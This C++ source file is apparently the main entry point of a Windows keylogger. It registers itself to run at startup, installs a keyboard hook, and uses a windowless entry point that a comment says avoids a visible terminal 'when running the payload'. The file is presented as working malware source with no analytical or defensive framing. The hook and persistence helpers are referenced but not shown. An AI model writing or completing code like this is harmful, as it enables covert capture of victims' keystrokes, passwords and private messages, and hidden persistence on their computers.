#include "keyboard.hpp"
#include "registry.hpp"
#include <Windows.h>

// The entry point for the application is a Windows subsystem to prevent a brief terminal 
// flicker when running the payload.
int APIENTRY wWinMain(_In_ HINSTANCE, _In_opt_ HINSTANCE, _In_ LPWSTR, _In_ int) noexcept
{
    registry::add_to_startup();
    keyboard::set_hook();

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0));
}
